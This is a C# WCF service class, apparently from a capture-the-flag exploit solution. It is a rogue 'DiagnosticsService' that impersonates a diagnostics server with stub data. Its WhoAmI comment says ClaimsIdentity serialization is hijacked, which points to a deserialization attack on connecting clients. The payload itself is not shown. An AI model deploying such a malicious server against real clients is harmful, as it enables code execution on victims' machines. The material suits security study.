using RemoteDiagnostics.Contract;
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Claims;
using System.Security.Principal;
using System.ServiceModel;
using System.Threading;

namespace Solution.Server
{
    // https://stackoverflow.com/questions/9293721/addressfilter-mismatch-at-the-endpointdispatcher-the-msg-with-to
    [ServiceBehavior(InstanceContextMode = InstanceContextMode.Single, AddressFilterMode = AddressFilterMode.Any)]
    public class DiagnosticsService : IDiagnostics
    {
        public bool Ping()
        {
            return true;
        }

        public WhoAmIObject WhoAmI()
        {
            // Vulnerability
            // ClaimsIdentity.SerializeClaims is hijacked by Program.SerializeClaimsHijack
            try
            {
                return new WhoAmIObject
                {
                    Identity = new ClaimsIdentity(WindowsIdentity.GetCurrent()),
                };
            }
            catch (Exception ex)
            {
                throw new FaultException<Fault>(Fault.CreateFromException(ex), Fault.CreateFaultReason(ex));
            }
        }

        public DiskInformationObject GetDiskInformation()
        {
            return new DiskInformationObject
            {
                Drives = new DriveInfo[0],
            };
        }

        public DirectoryInformationObject GetDirectoryInformation(string _path)
        {
            DirectoryInfo directoryInfo = new DirectoryInfo(".");

            FileSystemInfo[] children = null;
            if (directoryInfo.Exists)
            {
                children = directoryInfo.GetFileSystemInfos();
            }

            return new DirectoryInformationObject
            {
                Current = directoryInfo,
                Parent = directoryInfo.Parent,
                Root = directoryInfo.Root,
                Children = children,
            };
        }

        public HostInformationObject GetHostInformation()
        {
            return new HostInformationObject
            {
                MachineName = "Attacker server",
                OSVersion = new OperatingSystem(PlatformID.Win32S, new Version("attack")),
                ProcessorCount = 0,
            };
        }

        public NetworkInformationObject GetNetworkInformation()
        {
            return new NetworkInformationObject
            {
                Interfaces = new Interface[0]
            };
        }

        public ProcessObject[] GetProcesses()
        {
            return new ProcessObject[0];
        }

        public ProcessSecurityObject GetProcessSecurity(int processId)
        {
            string name = "Someone";
            string primarySid = "1234";
            GroupObject[] groups = new GroupObject[0];
            List<Privilege> privileges = new List<Privilege>();

            return new ProcessSecurityObject
            {
                Name = name,
                PrimarySid = primarySid,
                Groups = groups,
                Privileges = privileges
            };
        }
    }
}
